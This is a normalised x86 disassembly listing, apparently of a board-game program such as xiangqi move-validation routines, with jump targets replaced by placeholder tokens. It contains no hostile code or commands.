sub esp 0x14
movss xmm1 [ ebp + 0x8 ]
movss xmm0 [ ebp + 0x10 ]
mulss xmm0 xmm0
push ebx
mulss xmm1 xmm1
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_429780
movss xmm1 [ ebp + 0x10 ]
ucomiss xmm1 [ r--data ]
cvtsd2ss xmm0 xmm0
lahf
movss [ esp + 0x14 ] xmm0
test ah 0x44
jpe r-xdata
movss xmm0 [ ebp + 0x8 ]
cvtps2pd xmm0 xmm0
movsd [ esp + 0x8 ] xmm0
fld [ esp + 0x8 ]
cvtps2pd xmm0 xmm1
movsd [ esp + 0x8 ] xmm0
fld [ esp + 0x8 ]
call sub_4293da
fstp [ esp + 0x8 ]
movss xmm1 [ esp + 0x8 ]
movss xmm1 [ r--data ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
cdq
sub eax edx
sar eax 0x1
lea eax [ edx - 0x1 ]
cmp eax 0x2
ja r-xdata
movss xmm0 [ ebp + 0xc ]
divss xmm0 [ r--data ]
mov ecx [ ebp + 0x14 ]
mov eax ecx
shr eax 0x8
movzx eax al
mov [ esp + 0x4 ] eax
mov eax ecx
shr eax 0x10
movzx eax al
movzx ebx cl
mov [ esp + 0x8 ] eax
mulss xmm1 [ r--data ]
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_4295b0
movss xmm1 [ esp + 0x14 ]
mov ecx 0xa
mulsd xmm0 [ r--data ]
cvtps2pd xmm1 xmm1
addsd xmm0 xmm1
cvtsd2ss xmm0 xmm0
cvttss2si eax xmm0
cdq
idiv ecx
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x18 ]
jmp r-xdata
sub ebx eax
mov ecx 0x0
mov edx 0x0
cmovs ebx ecx
mov ecx [ esp + 0x4 ]
sub ecx eax
cmovs ecx edx
mov edx [ esp + 0x8 ]
sub edx eax
movzx ecx cl
mov eax 0x0
cmovs edx eax
movzx eax dl
shl eax 0x8
or eax ecx
movzx ecx bl
shl eax 0x8
or eax ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_406e50
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x14 ]
lea esi [ ebx * 4 + r--data ]
push edi
push esi
call sub_4075e0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebx * 4 + r--data ]
mov ebx [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ ebx + eax * 4 ]
cmp eax 0x20
je r-xdata
mov edx [ ebp + 0x8 ]
jne r-xdata
cmp eax 0x7
jne r-xdata
mov eax [ esi ]
cmp eax 0xd
ja r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ ebx + eax * 4 ]
cmp eax 0x20
je r-xdata
cmp [ eax * 4 + r--data ] 0x0
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x0
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x7
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_407550 ]
cmp [ eax * 4 + r--data ] 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0xb
jge r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
dec ecx
mov [ rw-data ] ecx
test ecx ecx
jle r-xdata
mov edx [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp esi ecx
jg r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ edi + 0x4 ]
mov esi [ edx + 0x4 ]
cmp ecx esi
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ecx ]
mov eax esi
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
sub eax [ edi + 0x4 ]
cdq
mov esi eax
mov eax [ edi ]
sub eax [ ecx ]
xor esi edx
sub esi edx
cdq
xor eax edx
sub eax edx
add esi eax
cmp esi 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
cmp edx esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edx esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
mov esi [ ecx ]
sub eax esi
mov [ ebp - 0xc ] eax
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x4 ] eax
cmp eax 0x1
jne r-xdata
mov eax [ eax ]
lea esi [ eax + eax * 2 ]
lea eax [ ecx + esi * 4 ]
lea eax [ edx + eax * 4 ]
nop
mov eax [ eax ]
lea esi [ eax + eax * 2 ]
lea eax [ ecx + esi * 4 ]
lea eax [ edx + eax * 4 ]
nop
mov eax [ edi ]
sub ecx esi
sub eax [ edx ]
cdq
xor eax edx
sub eax edx
add eax ecx
cmp eax 0x1
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
sub eax [ ecx ]
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jle r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] eax
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov esi [ edi ]
mov edi [ eax ]
cmp edi esi
jge r-xdata
mov eax [ eax ]
cmp eax [ edi ]
jne r-xdata
mov edi [ edi ]
lea eax [ edi + edi * 2 ]
lea eax [ esi + eax * 4 ]
cmp [ ebx + eax * 4 ] 0x20
jne r-xdata
mov eax [ ecx ]
cmp eax [ edi ]
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0xc ] eax
sub eax ecx
mov [ ebp - 0x8 ] eax
cdq
xor eax edx
sub eax edx
cmp eax 0x2
je r-xdata
lea eax [ ecx + esi * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x0
je r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx 0xb
jl r-xdata
lea eax [ ecx + esi * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x7
je r-xdata
dec ecx
sub eax 0x4
mov [ rw-data ] ecx
test ecx ecx
jg r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
add eax esi
cdq
sub eax edx
sar eax 0x1
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0xc ]
add eax [ edi + 0x4 ]
cdq
sub eax edx
sar eax 0x1
lea eax [ eax + ecx * 4 ]
cmp [ ebx + eax * 4 ] 0x20
je r-xdata
lea ecx [ esi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx edi
jge r-xdata
lea ecx [ edi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx esi
jge r-xdata
mov eax [ ebp + 0x10 ]
cmp edx esi
jne r-xdata
xor ecx ecx
cmp edx esi
jne r-xdata
cmp edx esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edi eax
mov ecx [ ecx + 0x4 ]
sub edi ecx
mov [ ebp + 0xc ] eax
mov eax edi
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jne r-xdata
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
jge r-xdata
jge r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ eax ]
cmp esi edi
jge r-xdata
jge r-xdata
mov ecx [ ecx ]
cmp ecx edi
jge r-xdata
jmp r-xdata
mov eax esi
sub eax [ ebp - 0x10 ]
cmp eax 0x2
jne r-xdata
inc esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx edi
jl r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx esi
jl r-xdata
lea ecx [ esi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx edx
jge r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx esi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edx
jge r-xdata
inc edx
mov [ rw-data ] edx
cmp edx esi
jge r-xdata
inc edi
mov [ rw-data ] edi
cmp edi esi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edx
jge r-xdata
inc edx
mov [ rw-data ] edx
cmp edx esi
jge r-xdata
inc edi
mov [ rw-data ] edi
cmp edi ecx
jge r-xdata
inc ecx
mov [ rw-data ] ecx
cmp ecx edi
jge r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
cmp edi 0x2
jne r-xdata
dec esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
lea eax [ esi + esi * 2 ]
lea eax [ ecx + eax * 4 ]
cmp [ ebx + eax * 4 ] 0x20
jne r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax [ ebp + 0x10 ]
sub edx esi
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
add esi edx
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] esi
mov eax [ ebp + 0x10 ]
sub esi edx
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
add edx esi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] edx
nop [ eax ] eax
lea eax [ edi + edi * 2 ]
sub esi edi
lea eax [ edx + eax * 4 ]
add edi esi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] edi
nop [ eax + eax ] ax
lea eax [ esi + esi * 2 ]
sub edi esi
lea eax [ edx + eax * 4 ]
add esi edi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] esi
mov eax [ ecx ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
mov eax [ ecx ]
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop
lea eax [ edi + edi * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax ecx
sub eax [ ebp + 0xc ]
cmp eax 0x2
jne r-xdata
inc ecx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx edx
jl r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx esi
jl r-xdata
add eax 0x4
sub edx 0x1
jne r-xdata
inc ecx
add eax 0x4
sub esi 0x1
jne r-xdata
inc ecx
add eax 0x30
sub esi 0x1
jne r-xdata
inc ecx
add eax 0x30
sub edi 0x1
jne r-xdata
inc ecx
inc esi
add eax 0x4
mov [ rw-data ] esi
cmp esi edx
jl r-xdata
inc edx
add eax 0x4
mov [ rw-data ] edx
cmp edx esi
jl r-xdata
inc edi
add eax 0x30
mov [ rw-data ] edi
cmp edi ecx
jl r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx edi
jl r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
dec ecx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_407590
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx 0x84
push esi
push edi
mov esi r--data
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0xc ]
xor eax eax
nop [ eax ] eax
inc eax
add esi 0x8
cmp eax 0x20
jl r-xdata
lea edx [ ecx + ecx * 2 ]
mov ecx [ esi + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebx + ecx * 4 ] eax
mov ecx [ esi ]
mov [ rw-data ] esi
test ecx ecx
je r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
pop ebp
retn
sub_4075e0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
cmp edx 0x1
jl r-xdata
xor eax eax
pop ebp
retn
cmp edx 0x9
jg r-xdata
mov ecx [ ecx + 0x4 ]
cmp ecx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax 0xd
ja r-xdata
mov eax 0x1
pop ebp
retn
jmp [ eax * 4 + jump_table_4077a0 ]
cmp edx 0x6
jg r-xdata
cmp edx 0x4
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp ecx 0x7
jg r-xdata
cmp edx 0x6
jg r-xdata
cmp edx 0x4
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp ecx 0x4
jl r-xdata
cmp edx 0x4
jl r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0xa
je r-xdata
cmp edx 0x3
jne r-xdata
cmp ecx 0x8
je r-xdata
cmp ecx 0x5
jle r-xdata
cmp edx 0x4
jl r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0x1
je r-xdata
cmp edx 0x3
jne r-xdata
cmp ecx 0x3
je r-xdata
cmp ecx 0x6
jge r-xdata
cmp ecx 0x8
jge r-xdata
cmp edx 0x6
jne r-xdata
cmp ecx 0x9
je r-xdata
cmp ecx 0x8
je r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0xa
je r-xdata
and edx 0x80000001
jns r-xdata
cmp ecx 0x3
jle r-xdata
cmp edx 0x6
jne r-xdata
cmp ecx 0x2
je r-xdata
cmp ecx 0x3
je r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0x1
je r-xdata
and edx 0x80000001
jns r-xdata
xor eax eax
pop ebp
retn
cmp ecx 0xa
je r-xdata
cmp edx 0x7
jne r-xdata
cmp ecx 0x8
je r-xdata
cmp ecx 0x6
je r-xdata
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
xor eax eax
pop ebp
retn
cmp ecx 0x1
je r-xdata
cmp edx 0x7
jne r-xdata
cmp ecx 0x3
je r-xdata
cmp ecx 0x5
je r-xdata
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
cmp ecx 0x8
cmp edx 0x9
jne r-xdata
cmp ecx 0xa
je r-xdata
xor eax eax
pop ebp
retn
cmp ecx 0x3
jmp r-xdata
cmp edx 0x9
jne r-xdata
cmp ecx 0x1
je r-xdata
jmp r-xdata
cmp ecx 0x6
je r-xdata
je r-xdata
cmp ecx 0x3
jmp r-xdata
cmp ecx 0x5
je r-xdata
sub_4077e0
push ebp
mov ebp esp
mov edx [ ebp + 0x18 ]
sub esp 0xc
mov ecx [ ebp + 0xc ]
xor eax eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
inc eax
cmp eax 0x1f
jle r-xdata
mov edi [ ecx + eax * 8 + 0x4 ]
mov [ rw-data ] edi
cmp eax 0x1f
ja r-xdata
mov ebx [ ecx + eax * 8 ]
mov [ rw-data ] ebx
test ebx ebx
je r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + lookup_table_408ed8 ]
jmp [ ecx * 4 + jump_table_408ea0 ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x14 ]
jne r-xdata
lea edi [ ebx + 0x1 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x6
jg r-xdata
lea edi [ ebx + 0x1 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x6
jg r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp edi 0x9
jg r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp edi 0x9
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
cmp [ edi + ecx * 4 + 0x30 ] 0x20
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
shl ecx 0x2
mov [ ebp - 0x4 ] ecx
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
cmp [ edi + ecx * 4 + 0x30 ] 0x20
jne r-xdata
inc ebx
cmp ebx 0x9
jg r-xdata
inc ebx
cmp ebx 0x9
jg r-xdata
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0x9
jg r-xdata
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0x9
jg r-xdata
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
inc edi
cmp edi 0xa
jg r-xdata
mov ebx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edi [ ebx + 0x84 ]
mov ebx [ ebx + 0x4 ]
inc edi
cmp edi ebx
jge r-xdata
inc edi
cmp edi 0x3
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edi [ ecx + 0x84 ]
mov ebx [ ecx + 0x4 ]
inc edi
cmp edi ebx
jge r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x6
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x6
jg r-xdata
cmp ebx 0x3
jg r-xdata
mov ebx [ rw-data ]
add ebx 0xfffffffe
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
add ebx 0xfffffffe
cmp edi 0x9
jg r-xdata
cmp ebx 0x5
jg r-xdata
mov edx [ rw-data ]
lea edi [ ebx - 0x1 ]
lea ecx [ edi + edi * 2 ]
mov [ rw-data ] edi
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x9
jg r-xdata
mov edx [ rw-data ]
lea edi [ ebx - 0x1 ]
lea ecx [ edi + edi * 2 ]
mov [ rw-data ] edi
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x9
jg r-xdata
mov ecx [ rw-data ]
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ rw-data ]
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
cmp edi 0x5
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov edi [ rw-data ]
cmp edi 0x6
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x8
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ rw-data ]
mov edi [ esi + 0x84 ]
mov esi [ ebp + 0x14 ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x18 ]
nop [ eax ] eax
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x18 ]
mov edi [ rw-data ]
dec edi
cmp edi 0x4
jl r-xdata
cmp ebx 0x8
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov edi [ rw-data ]
dec edi
cmp edi 0x4
jl r-xdata
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
lea edi [ ecx - 0x2 ]
cmp edi 0x1
jl r-xdata
cmp ebx 0x6
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ ecx - 0x2 ]
cmp edi 0x1
jl r-xdata
cmp ebx 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp [ edx + ecx * 4 + 0x4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add ebx 0xfffffffe
inc ecx
cmp ebx 0x1
jl r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ edx + ecx * 4 + 0x4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add ebx 0xfffffffe
inc ecx
cmp ebx 0x1
jl r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
inc ebx
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
inc ebx
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
